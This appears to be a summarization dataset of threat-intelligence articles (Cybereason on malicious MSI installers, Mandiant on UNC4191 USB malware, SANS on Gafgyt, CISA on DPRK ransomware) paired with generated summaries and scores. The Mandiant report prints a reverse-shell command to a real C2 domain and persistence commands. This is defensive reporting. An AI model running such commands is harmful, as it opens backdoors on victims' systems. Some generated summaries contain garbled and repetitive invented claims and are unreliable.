message is displayed to the user once the MSI file is run, MatanBuchus executes the main.dll file via regsvr32.exe in the background.Contents of notify.vbsFake error message displayed by notify.vbsThe file main.dll is used by MatanBuchus to load the payload, create C2 connections, and establish persistence in the exploited system.Matanbuchus Attack Tree, as seen from the Cybereason platformMatanBuchus MSI infection flowQbot / QakbotQbot (also known as Qakbot, Quakbot, and Pinkslipbot) is a modular Trojan that has been in circulation for over a decade. Its most prevalent campaigns consist of phishing attacks that attach malicious macros in Office documents, in particular Excel 4.0 macros, to evade detection.The MSI variants of Qbot started circulating in late April 2022, which coincidentally occurred around the time Microsoft implemented the VBA macro auto block feature, which made it harder for threat actors to launch successful attacks via macro-enabled malicious documents.MSI AnalysisAccording to the file metadata, the file is signed and verified by P.REGO, s.r.o.File SignatureWithin the Property Table, there were multiple references to VSDNET* properties, which are .NET components utilized by Visual Studio.MSI is known to organize an installation around the concepts of components, which is essentially an installing application or software. The malware is seen to have two components.Component Table, as seen from the Orca toolC__FEAF4022223844D1906F79DF588CDB8A: This component has a value _FEAF4022223844D1906F79DF588CDB8A in KeyPath, which is a primary key into the Registry, ODBCDataSource or File Table. The KeyPath _FEAF4022223844D1906F79DF588CDB8A appears to be a primary key of File (1.dll), this indicates the malware is going to drop a module 1.dll during installation.File Table, as seen from the Orca toolC__653B5566E1394F029FA3A18ACFFE5CC8: Unlike the C__FEAF4022223844D1906F79DF588CDB8A, this component does not have a KeyPath value. When the KeyPath value is NULL, then by default the Directory_ value will be utilized as the KeyPath value, which in this case is TARGETDIR. This component is for CreateFolder, and it contains references to a directory that needs to be created explicitly for a particular component. Once emptied during the installation, any directories created during the installation are removed. This component ensures that the directory set in TARGETDIR exists during and after the installation.CreateFolder Table, as seen from the Orca toolTo understand the behavior of this MSI, inspecting Custom Action is necessary. The CustomAction table contains four actions, however, the main actions of this malware are _9BED75AC_30E3_4BB1_9F26_1A4F247F32EF and DIRCA_TARGETDIR._9BED75AC_30E3_4BB1_9F26_1A4F247F32EF: Fetch and execute binary _C212458FE5F810E2D8287472A14C2665 DIRCA_TARGETDIR: Sets a target directory (TARGETDIR) to a local appdata directory (LocalAppDataFolder\ProductName)Custom Action TableThe first action (_9BED75AC_30E3_4BB1_9F26_1A4F247F32EF) refers to the source (_C212458FE5F810E2D8287472A14C2665), which is found under the Binary table.Binary Table, as seen from the Orca toolThe Custom Action _9BED75AC_30E3_4BB1_9F26_1A4F247F32EF has Type 3590, which indicates combinations of the type and relevant option.Type 6: Indicates VBScript stored within the Binary Table.Optional Term +3584: Indicates a scheduled execution after the successful completion of InstallFinalize action.With further investigation on Custom Action _C212458FE5F810E2D8287472A14C2665, the VBScript appears to execute dropped module (1.dll) from Component C__FEAF4022223844D1906F79DF588CDB8A via regsvr32.exe.VBScript _C212458FE5F810E2D8287472A14C2665The second Custom Action DIRCA_TARGETDIR configures the installation directory in the designated subdirectory (ProductName) of the local AppData directory (LocalAppDataFolder). The Product Name in this case has been named (SetupTest) as designated in the Property Table. As a result, DIRCA_TARGETDIR action configures the installation directory as (C:\Users\<UserName>\AppData\Local\SetupTest).Output folder path for installed file(s)From inspecting the MSI, it is evident that the malware drops a module (1.dll) onto the subdirectory (SetupTest) of the local appdata directory, which executes it by calling the VBScript embedded in the Binary table.QBot Attack Tree, as seen from the Cybereason platformQbot MSI infection flowComparative ChartThe following chart identifies key points seen in each malware's MSI behavior introduced in this chapter.Techniques in-use Magniber Ransomware MatanBuchus Loader Qbot Set installation directory to LocalAppDataFolder ?? ?? ?? Dump files to installation directory ?? ?? Custom Action: Execute executable via specified command line ?? Custom Action: Execute PE/script stored in Binary Table ?? ?? Execute dumped file in the installation directory ?? ?? Fake error message ?? Continuous malicious execution regardless of MSI failure. ?? ??Comparative ChartPurple TeamThis chapter focuses on key points for possibly identifying a malicious MSI, as well as a tool which can assist defenders to analyze the MSI files, which has already been leveraged in the Blue Team section.Suspicious IndicatorsThere are three malicious indicators that can identify suspicious MSI files:Mismatch between file detail and digital signature Misleading errors Suspicious installation pathCheckpointsMismatch in File Detail and Digital SignatureMSI files often masquerade as legitimate installation software of well known applications. However, the digital signature for the MSI file does not match with the issuing author, as shown in the images below. Mismatches between the description or origin of an MSI file and the digital signature can indicate the file is actually malicious, especially when it purports to be from a well-known software vendor.Magniber RansomwareMismatch between the file information and the digital signatureMatanBuchus LoaderMismatch between the file information and the digital signatureMisleading ErrorsMany different types of malware are known to trick victims in various ways. For malware that utilizes MSI, it is seen to output false error messages either by embedding a script or crashing the installation. The error message is designed to trick victims into thinking the software installation was not successful because the installer or their environment was not configured properly. The false error outputs can indicate malicious activity.Possible error messagesSuspicious Installation PathOften, the purpose of an MSI is to install software and drop relevant applications onto a disk. However, when the root destination directory for the installation is set to the local AppData folder, this can indicate malicious behavior. Legitimate installations usually drop necessary files under C:\Program Files or C:\Program Files (x86).Installation directory configurationIn the above image, the malware drops ""installation"" files into the subfolder (ProductName) of the local AppData folder (LocalAppDataFolder).ToolsThere are tools defenders can use to analyze MSI files. This section introduces some of the tools and demonstrates their usage.MsitoolsMsitools are a set of tools that allow developers to create and inspect MSI files. However, the tools can be also used by defenders to analyze malicious MSI files. There are three main Msitools that defenders can use: msiinfo, msidump, and msidiff. These tools are command-line-based, which makes them easier to automate and include in a malware analysis pipeline.MsiinfoMsiinfo is a command-line tool that allows users to list and extract streams or tables stored in the MSI file.As an example, an analyst investigates the relevant MSI file 15f4cfd.msi (Qbot) by executing the streams command-line option and identifies a binary stored in the Binary Table. In order to investigate Binary._C212458FE5F810E2D8287472A14C2665, the analyst can dump this binary stream by utilizing the extract command-line option.Output streams with msiinfoMsidumpMsidump is also another command-line tool that dumps relevant tables as idt text and streams stored in an MSI file. The investigative method and use is similar to msiinfo.Output streams with msidumpMsidiffMsidiff is a command-line tool that compares two MSI files by diffing each sample. For example, an analyst may compare two different installers for its validity using msidiff. To verify if the two installers are installing and dumping the same files, the analyst can use command-line option -l to list and compare the files likely to be dumped.List of files from msidiff, from the QBot exampleOledump.pyOledump.py is a python script created by Didier Stevens that's mainly utilized to analyze OLE documents. Since OLE documents are COM Structured Storage, this Python script allows defenders to analyze the MSI file as well.Oledump.py showing streams from 15f4cfd.msiEach row consists of the following three columns:Stream Number Stream Size Stream NameIn most cases, when utilizing MSI file with oledump.py, the stream name is usually incomprehensible, as shown in the image above.Oledump.py showing stream 4 detailBy specifying the stream number with ""-s"" option, the oledump.py dumps the content of the stream. In the image above, the stream 4 has file header MSCF, which is a header for a CAB file.ORCAORCA is a GUI-based Windows SDK component that allows users to edit and view MSI database tables. An analyst can open the MSI file in question and navigate to each table to investigate. The GUI makes the process of investigation simpler since it is visually easier to follow.Orca showing CustomAction tableRecommendationsThe Cybereason GSOC recommends the following actions to detect and respond to malicious MSI attacks:In the Cybereason platform, enable both the Signature and Artificial Intelligence modes on the Cybereason NGAV, and enable the Detect and Prevent modes of these features.Handle files originating from external sources (email, web browsing) with caution.Contact a Cybereason Defender. The Cybereason MDR team provides custom hunting queries for detecting specific threats. To find out more about threat hunting and managed detection and response with the Cybereason Defense Platform, see Managed Detection and Response.If you are a Cybereason customer, see the NEST for more information, including custom hunting queries for detecting this threat.Cybereason is dedicated to teaming with Defenders to end cyber attacks from endpoints to the enterprise to everywhere. Learn more about Cybereason XDR, check out our Extended Detection and Response (XDR) Toolkit, or schedule a demo today to learn how your organization can benefit from an operation-centric approach to security.About The ResearchersKotaro Ogino, Principal Security Analyst, Cybereason Global SOCKotaro Ogino is a Principal Security Analyst with the Cybereason Global SOC team. He is involved in threat hunting, administration of Security Orchestration, Automation, and Response (SOAR) systems, and Extended Detection and Response (XDR). Kotaro holds a bachelor of science degree in information and computer science.Ralph Villanueva, Senior Security Analyst, Cybereason Global SOCRalph Villanueva is a Senior Security Analyst with the Cybereason Global SOC team. He works hunting and combating emerging threats in the cybersecurity space. His interests include malware reverse engineering, digital forensics, and studying APTs. He earned his Master's Degree in Network Security from Florida International University.Robin Plumer, Security Analyst, Cybereason Global SOCRobin Plumer is a Security Analyst with the Cybereason Global SOC team. He analyzes and triages malware operations and researches new and emerging threats. He earned his Bachelor's degree in cybersecurity management from Bournemouth University, UK.";The ITSecurity report indicates that the malware drops a module (1.dll) onto the subdirectory (SetupTest) of the local appdata directory, which executes it by calling the VBScript embedded in the Binary table. Additionally, the malware continuously malicious execution regardless of MSI failure. The Cybereason GSOC recommends the following actions to detect and respond to malicious MSI attacks:In the Cybereason platform, enable both the Signature and Artificial Intelligence modes on the Cybereason NGAV, and enable the Detect and Prevent modes of these features.Handle files originating from external sources (email, web browsing) with caution.Contact a Cybereason Defender. The Cybereason MDR team provides custom hunting queries for detecting specific threats. To find out more about threat hunting and managed detection and response with the Cybereason Defense Platform, see Managed Detection and Response.If you are a Cybereason customer, see the NEST for more information, including custom hunting queries for detecting this threat.Cybereason is dedicated to teaming with Defenders to end cyber attacks from endpoints to the enterprise to everywhere. The Cybereason Defense Platform is an operationcentric approach to security that combines threat hunting, managed detection and response (MDR), and threat intelligence. Threat hunting is a proactive approach to detecting and responding to threats, while MDR is a reactive approach to detecting and responding to threats. Threat intelligence is a proactive approach to detecting and responding to threats, while MDR is a reactive approach to detecting and responding to threats. Cybereason is dedicated to teaming with Defenders to end cyber attacks from endpoints to the enterprise to everywhere. Learn more about Cybereason XDR, check;en;{'r': 0.08667621776504297, 'p': 0.9097744360902256, 'f': 0.15827337970659253};{'r': 0.04573863636363636, 'p': 0.7931034482758621, 'f': 0.08648938924560173};{'r': 0.08595988538681948, 'p': 0.9022556390977443, 'f': 0.15696533523308043}
https://www.mandiant.com/resources/blog/china-nexus-espionage-southeast-asia;Always Another Secret: Lifting the Haze on China-nexus Espionage in Southeast Asia;"Mandiant Managed Defense recently identified cyber espionage activity that heavily leverages USB devices as an initial infection vector and concentrates on the Philippines. Mandiant tracks this activity as UNC4191 and we assess it has a China nexus.UNC4191 operations have affected a range of public and private sector entities primarily in Southeast Asia and extending to the U.S., Europe, and APJ, however, even when targeted organizations were based in other locations, the specific systems targeted by UNC4191 were also found to be physically located in the Philippines.Following initial infection via USB devices, the threat actor leveraged legitimately signed binaries to side-load malware, including three new families we refer to as MISTCLOAK, DARKDEW, and BLUEHAZE. Successful compromise led to the deployment of a renamed NCAT binary and execution of a reverse shell on the victim's system, providing backdoor access to the threat actor. The malware self-replicates by infecting new removable drives that are plugged into a compromised system, allowing the malicious payloads to propagate to additional systems and potentially collect data from air-gapped systems.Mandiant Managed Defense performs continuous threat hunting for customers, discovering evidence of new tactics, techniques, and procedures (TTPs) that can evade traditional detection mechanismsIn response to this campaign, Mandiant deployed new real-time detections, enhancing Managed Defense's protection for our customers from future similar activity. Our Adversary Operations team created and deployed YARA rules and Mandiant Security Validation Actions, shared at the end of the post. This blog post details our initial threat hunting discovery, the newly identified malware families, detection opportunities, and Mandiant's assessment about the goals and motivations of the threat actor.Malware ObservedMandiant observed UNC4191 deploy the following malware families.Table 1: UNC4191 Malware Families Malware Family Description MISTCLOAK MISTCLOAK is a launcher written in C++ that executes an encrypted executable payload stored in a file on disk. BLUEHAZE BLUEHAZE is a launcher written in C/C++ that launches a copy of NCAT to create a reverse shell to a hardcoded command and control (C2). DARKDEW DARKDEW is a dropper written in C++ that is capable of infecting removable drives. NCAT NCAT is a command-line networking utility that was written for the Nmap Project to perform a wide-variety of security and administration tasks. While NCAT may be used for legitimate purposes, threat actors may also use it to upload or download files, create backdoors or reverse shells, and tunnel traffic to evade network controls.Initial DetectionMandiant Managed Defense customers receive Mandiant's dedicated proactive Threat Hunting service. Mandiant's threat hunting team leverages the MITRE ATT&CK(r) framework as a guide for developing Hunt Missions that examine endpoint telemetry data, such as process events, for collection and ATT&CK technique ID tagging. The resulting threat hunting data set provides the team with wide visibility across the customer base. When performing analysis, we augment this data set with more targeted sources, like custom, real-time alerting from our customers' endpoint detection and response (EDR) technologies.Mandiant uses custom tooling to identify ATT&CK technique sequences and clusters associated with common threat actor behaviors. A technique sequence is useful for identifying events with a defined order of execution, such as the creation of a local account (T1136.001) and then addition to the local Administrators group (T1098). A technique cluster identifies a grouping of techniques that don't necessarily occur in a specific order. By focusing on technique sequences and clusters, we reduce the amount of data that needs to be manually reviewed by analysts.For example, Mandiant has observed threat actors enumerating domain trusts (T1482) and querying domain and local group permissions (T1069.001, T1069.002) within a several minute span (Figure 1). The combined event count for these three techniques occurring on their own can number in the hundreds of thousands, but by applying technique sequencing or clustering we can reduce the number of interesting events to a manageable amount.Figure 1: Visualization of technique sequencing and clustering conceptsMandiant identified this UNC4191 campaign by searching for anomalous sequences of events under our ""Mandiant Intelligence: Staging Directories"" and ""Command and Scripting Interpreter: Windows Command Shell (T1059.003)"" hunting missions (Figure 2).Figure 2: Technique sequence that led to UNC4191 detectionThe techniques performed by UNC4191 led to the development of additional technique sequences and detection opportunities, as described in the Detection Opportunities section.UNC4191 Malware Infection CycleThe overall infection cycle from this campaign can be split into three distinct phases, shown in Figure 3.Figure 3: UNC4191 malware infection cyclePHASE I: MISTCLOAKThe infection chain begins when a user plugs in a compromised removable device and manually executes a renamed signed binary from the root directory of the storage volume (T1091). The initial binaries--named Removable Drive.exe or USB Drive.exe--are versions of a legitimately signed application called USB Network Gate, developed by the company Electronic Team, Inc. These are used to side-load the MISTCLOAK malware that impersonates a legitimate DLL (Table 2).Table 2: Legitimate USB Network Gate binaries used to side-load MISTCLOAK malware MD5: f45726a9508376fdd335004fca65392a File Name(s): D:\Removable Disk.exe, D:\USB Drive.exe Signature Subject: Electronic Team, Inc Product Name: USB Network Gate Original File Name: UsbConfig.exe MD5: 707de51327f6cae5679dee8e4e2202ba File Name(s): D:\Removable Disk.exe, D:\USB Drive.exe Signature Subject: Electronic Team, Inc Product Name: USB Network Gate Original File Name: UsbConfig.exeThe renamed USB Network Gate binaries load a MISTCLOAK DLL named u2ec.dll from the execution directory on the removable device (T1574.002) (Table 3). MISTCLOAK is a launcher for the encrypted file usb.ini, which MISTCLOAK reads from the current directory or the path autorun.inf\Protection for Autorun\System Volume Information\usb.ini. Mandiant identified the PDB file path G:\project\APT\U???ew\shellcode\Release\shellcode.pdb in the MISTCLOAK sample. Notably, the Chinese characters ??? translate to ""disk hijacking"".Table 3: MISTCLOAK malware metadata MD5: 7753da1d7466f251b60673841a97ac5a File Name: u2ec.dll Compile Time: 2021-09-01T09:23:30Z Exports: u2ec.dll Size: 82,944 PDB filename: G:\project\APT\U???ew\u2ec\Release\u2ec.pdb (G:\project\APT\U Disk Hijackingew\u2ec\Release\u2ec.pdb)MISTCLOAK then opens Windows Explorer to the location on the removable device where the user files are stored with the command 'explorer.exe ""<drive>:\autorun.inf\Protection for Autorun""'.Phase II: DARKDEWThe file usb.ini contains an encrypted DLL payload called DARKDEW that is capable of infecting removable drives. If executed from a removable drive, DARKDEW will launch explorer.exe via `explorer.exe ""<drive>:\autorun.inf\Protection for Autorun""` where <drive> is a removable drive letter, such as ""E"". DARKDEW will then check if either C:\ProgramData\udisk\disk_watch.exe or C:\ProgramData\udisk\DateCheck.exe exist and will create the directory C:\ProgramData\udisk if neither are found.Table 4: DARKDEW malware metadata MD5: 6900cf5937287a7ae87d90a4b4b4dec5 File Name: N/A Compile Time: 2021-09-09T08:45:31Z Exports: N/A Size: 123,904 PDB filename: G:\project\APT\U???ew\shellcode\Release\shellcode.pdbDARKDEW then proceeds to copy every file from <drive>:\autorun.inf\Protection for Autorun\System Volume Information\ to C:\ProgramData\udisk\. Mandiant identified files in this directory, such as Removable Drive (16GB).lnk, that originated from a system that was previously compromised by DARKDEW (T1074.001) and copied to a USB device. The copied data includes the files shown in Table 5 and arbitrary files with the extensions: xlsx, docx, mp4, device, jpg, pptx, pdf, txt, and lnk files.Table 5: Files that are copied by DARKDEW from the removable drive to a compromised system C:\ProgramData\udisk\disk_watch.exe C:\ProgramData\udisk\libeay32.dll C:\ProgramData\udisk\Removable Disk.exe C:\ProgramData\udisk\rzlog4cpp.dll C:\ProgramData\udisk\rzlog4cpp_logger.dll C:\ProgramData\udisk\ssleay32.dll C:\ProgramData\udisk\u2ec.dll C:\ProgramData\udisk\USB Drive.exe C:\ProgramData\udisk\usb.ini C:\ProgramData\udisk\UsbConfig.exe C:\ProgramData\udisk\wuwebv.exe C:\ProgramData\udisk\DateCheck.exe C:\ProgramData\udisk\example.jpg C:\ProgramData\udisk\example.xlsxDARKDEW will then copy the renamed USB Network Gate binary (e.g., Removable Drive.exe) to C:\ProgramData\udisk\disk_watch.exe and create persistence with a registry key value named udisk under HKCU\Software\Microsoft\Windows\CurrentVersion\Run (T1547.001). Finally, DARKDEW will launch a file named C:\ProgramData\udisk\DateCheck.exe and then exit.Table 6: DARKDEW registry persistence Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run Value: udisk Text: c:\programdata\udisk\disk_watch.exeIf DARKDEW is executed from a non-removable drive, the behavior is slightly different. DARKDEW will create the directory C:\ProgramData\udisk\, then copy every file in the current directory of the parent executable to C:\ProgramData\udisk\. It will then copy the parent executable to C:\ProgramData\udisk\disk_watch.exe and launch it. The persistence mechanism is identical, and it will also launch C:\ProgramData\udisk\DateCheck.exe.When DARKDEW is executed within the context of disk_watch.exe, the malware will scan the system every 10 seconds for removable drives by enumerating volumes from A to Z until it finds one that is removable. The DARKDEW malware then creates the directory <drive>\autorun.inf\Protection for Autorun\, sets its attribute to hidden, and copies the contents of the current working directory of disk_watch.exe to that directory or the subdirectory <drive>:\autorun.inf\Protection for Autorun\System Volume Information\. This capability appears to be a method for self-replication and to transfer files that may be collected from air-gapped systems.Phase III: BLUEHAZEThe binary DateCheck.exe is a renamed version of a legitimate, signed application called Razer Chromium Render Process by Razer USA Ltd. (Table 7).Table 7: Legitimate Razer USA Ltd. binary used to side-load BLUEHAZE malware MD5: ea7f5b7fdb1e637e4e73f6bf43dcf090 File Name(s): DateCheck.exe Signature Subject: Razer USA Ltd. Product Name: Razer Chromium Render Process Original File Name: RzCefRenderProcess.exeThe renamed Razor application, DateCheck.exe, loads the legitimate file rzlog4cpp_logger.dll, which calls the getRoot function from the BLUEHAZE malware RzLog4CPP.dll during C runtime startup (T1574.002).Table 8: BLUEHAZE malware metadata MD5: f632e4b9d663d69edaa8224a43b59033 File Name: RzLog4CPP.dll Compile Time: 2021-09-09T09:27:12Z Exports: log4cpp.dll Size: 201,216 PDB filename: N/ABLUEHAZE will create a new directory called C:\Users\Public\Libraries\CNNUDTV\, then it will create the registry key value ACNTV under HKCU\Software\Microsoft\Windows\CurrentVersion\Run (T1547.001) for persistence. Next, BLUEHAZE copies all the files from its working directory to C:\Users\Public\Libraries\CNNUDTV\ and then executes a renamed NCAT executable wuwebv.exe to create a reverse shell to the hard-coded command and control (C2) address: closed[.]theworkpc[.]com:80 (T1059). Mandiant has not observed evidence of reverse shell interaction, however, based on the age of the activity, this may be a result of visibility gaps or short log retention periods.Table 9: BLUEHAZE command execution DateCheck.exe >""cmd.exe /C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ACNTV /t REG_SZ /d \""Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \""C:\\Users\\Public\\Libraries\\CNNUDTV\\DateCheck.exe\""\"" /f"" cmd.exe /c copy *.* C:\\Users\\Public\\Libraries\\CNNUDTV\\"" cmd.exe /C wuwebv.exe -t -e c:\\windows\\system32\\cmd.exe closed.theworkpc[.]com 80Outlook and ImplicationsBased on available data, such as PE compile timestamps for the malware involved in the aforementioned activity, this campaign potentially extends back to September 2021. Given the worming nature of the malware involved, we may have detected the later stages of this malware's proliferation.We believe this activity showcases Chinese operations to gain and maintain access to public and private entities for the purposes of intelligence collection related to China's political and commercial interests. Our observations suggest that entities in the Philippines are the main target of this operation based on the number of affected systems located in this country that were identified by Mandiant.Campaign TrackingMandiant will continue to monitor UNC4191's campaign and will provide notable and dynamic updates regarding changes in tactics and techniques, the introduction of tools with new capabilities, or the use of new infrastructure to carry out their mission.For more insights into how Mandiant tracks this and similar campaigns, see our Threat Campaigns feature within Mandiant Advantage Threat Intelligence.Detection OpportunitiesEach Mandiant threat hunting discovery is evaluated for opportunities to create new real-time detections. These detections help Mandiant identify additional activity across our customers' environments for rapid escalation and triage analysis and aim to reduce threat actor dwell time.Following our initial campaign discovery, we immediately searched the entire Managed Defense customer base for any activity that matched our atomic indicators of interest, including filenames, file paths, file hashes, IP addresses, domains, and other artifacts. This uncovered activity on systems at multiple customers.Additionally, we also created or updated real-time Managed Defense detections to identify threat actor methodologies, such as:Deployment or usage of NETCAT and NCAT reverse shellsModification of registry Run keys for malware persistence, with arguments configured to execute the Windows binary rundll32.exeProcesses launched from the C:\Users\Public\Libraries\ directoryBy combining Mandiant's threat intelligence service with Managed Defense's detection engineering and threat hunting capabilities, we can rapidly identify and provide context around malicious activity.Detection Opportunity MITRE ATT&CK Event Details NCAT reverse shell execution arguments T1059 wuwebv.exe -t -e c:\\windows\\system32\\cmd.exe closed.theworkpc[.]com 80 Parent or grandparent processes executing from Non-C:\ Drive Root T1091, T1036 Process: D:\USB Drive.exe Child Processes: > explorer.exe ""D:\autorun.inf\Protection for Autorun"" > c:\programdata\udisk\disk_watch.exe > c:\programdata\udisk\DateCheck.exe Grandchild Processes: >> ""cmd.exe /C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ACNTV /t REG_SZ /d \""Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \""C:\\Users\\Public\\Libraries\\CNNUDTV\\DateCheck.exe\""\"" /f"" >> cmd.exe /c copy *.* C:\\Users\\Public\\Libraries\\CNNUDTV\\"" >> cmd.exe /C wuwebv.exe -t -e c:\\windows\\system32\\cmd.exe closed.theworkpc[.]com 80 Registry Run key persistence for binary in PROGRAMDATA T1060 Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run Value: udisk Text: c:\programdata\udisk\disk_watch.exe Registry Run key executing RunDLL32 command T1218.011, T1060 reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ACNTV /t REG_SZ /d \""Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \""C:\\Users\\Public\\Libraries\\CNNUDTV\\DateCheck.exe\""\"" /f"" File name of executing process doesn't match original name T1036, T1574.002 OriginalFileName: UsbConfig.exe File Name: Removable Disk.exe, USB Drive.exe OriginalFileName: RzCefRenderProcess.exe File Name: DateCheck.exe Windows Explorer process execution with folder path specified on command line T1091 Parent Process Path: D:\USB Drive.exe Process: explorer.exe Command Line: explorer.exe ""D:\autorun.inf\Protection for Autorun""Mandiant Security Validation ActionsOrganizations can validate their security controls using the following actions with Mandiant Security Validation.VID Name A105-454 Protected Theater - UNC4191, BLUEHAZE, Execution, Variant 1 A105-455 Protected Theater - UNC4191, DARKDEW, Execution, Variant 1 A105-466 Command and Control - UNC4191, DNS Query, Variant 1YARA RulesMISTCLOAKrule M_Hunting_Launcher_MISTCLOAK_1 { meta: author = ""Mandiant"" strings: $s1 = ""CheckUsbService"" ascii $s2 = ""new\\u2ec\\Release\\u2ec.pdb"" ascii $s3 = ""autorun.inf\\Protection for Autorun"" ascii condition: uint16(0) == 0x5a4d and filesize < 200KB and (2 of ($s*)) }DARKDEWrule M_Hunting_Dropper_DARKDEW_1 { meta: author = ""Mandiant"" strings: $s1 = ""do inroot"" ascii $s2 = ""disk_watch"" ascii $s5 = ""G:\\project\\APT\\"" ascii $s3 = ""c:\\programdata\\udisk"" ascii $s4 = ""new\\shellcode\\Release\\shellcode.pdb"" ascii condition: filesize < 500KB and (2 of ($s*)) }BLUEHAZErule M_Hunting_Launcher_BLUEHAZE_1 { meta: author = ""Mandiant"" strings: $s1 = ""Libraries\\CNNUDTV"" ascii $s2 = ""closed.theworkpc.com"" ascii $s3 = ""cmd.exe /C wuwebv.exe -t -e"" ascii condition: uint16(0) == 0x5a4d and filesize < 500KB and (2 of ($s*)) }Indicators of CompromiseType Value Description Domain closed.theworkpc[.]com NCAT C2 MD5 7753da1d7466f251b60673841a97ac5a MISTCLOAK MD5 c10abb9f88f485d38e25bc5a0e757d1e DARKDEW (usb.ini file) MD5 6900cf5937287a7ae87d90a4b4b4dec5 DARKDEW (decrypted payload) MD5 f632e4b9d663d69edaa8224a43b59033 BLUEHAZE MD5 8ec339a89ec786b2aea556bedee679c7 NCAT MD5 f45726a9508376fdd335004fca65392a USB Network Gate (Legitimate Binary used for DLL Side-Loading) MD5 707de51327f6cae5679dee8e4e2202ba USB Network Gate (Legitimate Binary used for DLL Side-Loading) MD5 ea7f5b7fdb1e637e4e73f6bf43dcf090 Razer Chromium Render Process (Legitimate Binary used for DLL Side-Loading) File Path C:\ProgramData\udisk File and Malware Staging File Path C:\Users\Public\Libraries\CNNUDTV File and Malware StagingAcknowledgementsSpecial thanks to Tobias Krueger and Conor Quigley for their assistance with analyzing the MISTCLOAK, DARKDEW, and BLUEHAZE samples and Matthew Hoerger for creating Mandiant Security Validation (MSV) actions. We would also like to thank Tim Martin, Alexander Pennino, Nick Richard, and Sarah Hawley for their technical review and feedback.";Mandiant Managed Defense customers receive Mandiant's dedicated proactive Threat Hunting service. Mandiant's threat hunting team leverages the MITRE ATT&CK(r) framework as a guide for developing Hunt Missions that examine endpoint telemetry data, such as process events, for collection and ATT&CK technique ID tagging. The resulting threat hunting data set provides the team with wide visibility across the customer base. Mandiant identified the PDB file path G:\project\APT\U?? ?ew\shellcode\Release\shellcode.pdb in the MISTCLOAK sample. DARKDEW is a malware that is capable of infecting removable drives. It will scan the system every 10 seconds for removable drives by enumerating volumes from A to Z until it finds one that is removable. It will then copy the renamed USB Network Gate binary (e.g., Removable Drive.exe) to C:\ProgramData\udisk\disk_watch.exe and create persistence with a registry key value named udisk under HKCU\Software\Microsoft\Windows\CurrentVersion\Run (T1547.001). Finally, DARKDEW will launch a file named C:\ProgramData\udisk\DateCheck.exe and then exit. Mandiant will continue to monitor UNC4191's campaign and will provide notable and dynamic updates regarding changes in tactics and techniques, the introduction of tools with new capabilities, or the use of new infrastructure to carry out their mission. AcknowledgementsSpecial thanks to Tobias Krueger and Conor Quigley for their assistance with analyzing the MISTCLOAK, DARKDEW, and BLUEHAZE samples and Matthew Hoerger for creating Mandiant;en;{'r': 0.15478615071283094, 'p': 0.9806451612903225, 'f': 0.26737027029252713};{'r': 0.10122699386503067, 'p': 0.9428571428571428, 'f': 0.18282548301348212};{'r': 0.15478615071283094, 'p': 0.9806451612903225, 'f': 0.26737027029252713}
https://isc.sans.edu/diary.html?storyid=0;InfoSec Handlers Diary Blog;[This is a guest post submitted by Brock Perry [LinkedIn], one of our sans.edu undergraduate interns]Since 2014, self-replicating variants of DDoS attacks against routers and Linux-based IoT devices have been rampant. Gafgyt botnets target vulnerable IoT devices and use them to launch large-scale distributed denial-of-service attacks. SOHO and IoT devices are ubiquitous, less likely to have secure configurations or routine patches, and more likely to be at the internet edge. Attacks against these devices are less likely to be identified by enterprise monitoring techniques, and compromise may go unnoticed. Unwitting users then become part of attack propagation.An attack on Sept 19th, 2022, followed this familiar pattern, seeking to exploit known vulnerabilities in devices from multiple vendors - including D-Link, eir, Huawei, Netgear, TP-Link, and routers using Realtek SDK.ConnectionAn attacker or compromised device made numerous attempts to connect to the target with weak ssh credentials before eventually authenticating.Payload DropUpon authenticating, the attack downloads and executes the xd.86 payload.BotThe xd.86 botnet component searches out new targets. In the first 15 seconds, 1018 connection attempts are made to 115 unique addresses from an otherwise quiet system.Outbound Connection AttemptsUnique Destinations;The ITSecurity report summarizes the prevalence of selfreplicating variants of DDoS attacks against routers and Linuxbased IoT devices since 2014. Gafgyt botnets target vulnerable IoT devices and use them to launch largescale distributed denialofservice attacks. SOHO and IoT devices are ubiquitous, less likely to have secure configurations or routine patches, and more likely to be at the internet edge. Attacks against these devices are less likely to be identified by enterprise monitoring techniques, and compromise may go unnoticed. Unwitting users then become part of attack propagation. An attack on September 19th, 2022, followed this familiar pattern, seeking to exploit known vulnerabilities in devices from multiple vendors including DLink, eir, Huawei, Netgear, TPLink, and routers using Realtek SDK. Connection An attacker or compromised device made numerous attempts to connect to the target with weak ssh credentials before eventually authenticating. Payload Drop Upon authenticating, the attack downloads and executes the xd.86 payload. Bot The xd.86 botnet component searches out new targets. In the first 15 seconds, 1018 connection attempts are made to 115 unique addresses from an otherwise quiet system. Outbound Connection Attempts Unique Destinations;en;{'r': 0.7986577181208053, 'p': 0.8623188405797102, 'f': 0.8292682876902719};{'r': 0.7567567567567568, 'p': 0.7954545454545454, 'f': 0.7756232637011687};{'r': 0.7986577181208053, 'p': 0.8623188405797102, 'f': 0.8292682876902719}
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-040a;#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities;"SUMMARYNote: This Cybersecurity Advisory (CSA) is part of an ongoing StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and various ransomware threat actors. These StopRansomware advisories detail historically and recently observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all StopRansomware advisories and to learn about other ransomware threats and no-cost resources.The United States National Security Agency (NSA), the U.S. Federal Bureau of Investigation (FBI), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Department of Health and Human Services (HHS), the Republic of Korea (ROK) National Intelligence Service (NIS), and the ROK Defense Security Agency (DSA) (hereafter referred to as the ""authoring agencies"") are issuing this joint Cybersecurity Advisory (CSA) to highlight ongoing ransomware activity against Healthcare and Public Health Sector organizations and other critical infrastructure sector entities.This CSA provides an overview of Democratic People's Republic of Korea (DPRK) state-sponsored ransomware and updates the July 6, 2022, joint CSA North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector. This advisory highlights TTPs and IOCs DPRK cyber 